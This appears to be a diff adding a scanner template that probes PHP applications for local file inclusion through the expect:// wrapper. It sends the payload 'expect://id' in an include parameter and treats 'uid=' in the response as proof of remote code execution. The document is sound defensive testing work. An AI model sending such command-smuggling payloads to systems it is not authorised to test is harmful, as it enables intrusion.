@@ -1,0 +1,22 @@
+id: patt-lfi-wrap-expect-01-include
+name: 'PATT lfi patt-lfi-wrap-expect-01 via include'
+severity: critical
+type: active
+tags:
+  - lfi
+  - patt
+  - wrapperphp
+requires:
+  - php
+description: 'PATT expect:// RCE direct. [patt:patt-lfi-wrap-expect-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Wrappers.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
